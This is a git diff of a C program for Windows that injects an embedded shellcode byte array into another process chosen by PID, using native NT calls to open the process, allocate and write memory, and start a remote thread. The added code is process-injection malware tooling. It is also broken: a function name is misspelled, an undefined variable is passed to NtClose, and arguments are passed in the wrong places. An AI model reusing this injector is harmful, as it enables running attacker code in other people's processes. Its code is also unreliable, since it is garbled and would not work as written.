@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <Windows.h>
 #include "uuu.h"
+#include <winternl.h>
 
 DWORD PID = NULL;
 
@@ -10,6 +11,25 @@ DWORD PID = NULL;
 
 HANDLE h;
 
+HMODULE getMod(LPCWSTR modName) {
+
+    HMODULE hModule = NULL;
+    i("trying to get a handle to %S", modName);
+
+    hModule = GetModuleHandleW(modName);
+
+    if (hModule == NULL) {
+        w("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
+        return NULL;
+    }
+
+    else {
+        k("got a handle to the module!");
+        i("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
+        return hModule;
+    }
+
+}
 unsigned char Buf[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
 0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
 0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
@@ -43,14 +63,23 @@ unsigned char Buf[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
 
 int main(int argc, char* argv[]) {
 
-    const HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    const NtOpenProcess _NtOpenProcess = (NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProces");
-    const NtWriteVirtualMemory _NtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNtdll,
+    NTSTATUS status = NULL;
+    PVOID rBuffer = NULL;
+    HANDLE hProc = NULL;
+    HANDLE hThread = NULL;
+    HMODULE hNTDLL = NULL;
+
+
+    hNTDLL = GetModuleHandleA("ntdll.dll");
+    const NtOpenProcess _NtOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProces");
+    const NtWriteVirtualMemory _NtWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL,
         "NtWriteVirtualMemory");
-    const NtAllocateVirtualMemory _NtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNtdll,
+    const NtAllocateVirtualMemory _NtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL,
         "NtAllocateVirtualMemory");
-    const NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll,
+    const NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL,
         "NtCreateThreadEx");
+    const NtClose _NtClose = (NtClose)GetProcAddress(hNTDLL,
+        "NtClose");
 
     int s = strlen((char*)Buf);
   if (argc < 2) {
@@ -59,34 +88,56 @@ int main(int argc, char* argv[]) {
       return EXIT_FAILURE;
   }
 
+    if (!_NtOpenProcess || !_NtWriteVirtualMemory || !_NtAllocateVirtualMemory || !_NtCreateThreadEx) {
+        w("Failed to load necessary functions.");
+        return EXIT_FAILURE;
+    }
+
     PID = atoi(argv[1]);
+    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL};
+    CLIENT_ID CID = { (HANDLE)PID, NULL};
 
 
-    HANDLE h = NtOpenProcess(WRITE_OWNER, true, PID);
+    status = NtOpenProcess(&hProc,PROCESS_ALL_ACCESS,&OA, &CID);
+
 
     i(" getting proc handle...");
-    int p = NtAllocateVirtualMemory(h, &Buf, s,0x00001000,0x40 );
+    if(status != STATUS_SUCCESS) {
+        w("failed to get handle on process. 0x%x", status);
+        goto CLEANUP;
+    }
+    status = NtAllocateVirtualMemory(&hProc, &Buf, s,0x00001000,0x40 );
 
     // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40
 
 
 i(" allocating... ");
-    NtWriteVirtualMemory(h, &Buf, Buf, s, NULL);
+  status = NtWriteVirtualMemory(&hProc,&hProc,&Buf,s,NULL);
+
     //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
     i("writing v mem");
-    if(NtCreateThreadEx(NULL, s, &Buf, NULL, h,NULL) != 0)
-//0x1FFFFF, IntPtr.Zero, h, memAlloc, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
-
-        {
-        k(" thread created!");
-    }
-    else {
-
-        w(" unable to create thread :(");
-        return EXIT_FAILURE;
-    }
+hThread = NtCreateThreadEx(s,&Buf, NULL,(PTHREAD_START_ROUTINE)hProc, NULL, 0, 0,0,0,NULL);
 
 
+    status = NtClose(y);
 
     return EXIT_SUCCESS;
+
+
+
+CLEANUP:
+
+    if (hThread) {
+            i("closing handle to thread");
+            CloseHandle(hThread);
+        }
+    if (hProc) {
+        i("closing handle to process");
+        CloseHandle(hProc);
+    }
+
+    k("finished with the cleanup, exiting now. goodbye :>");
+    return EXIT_SUCCESS;
+
 }
+
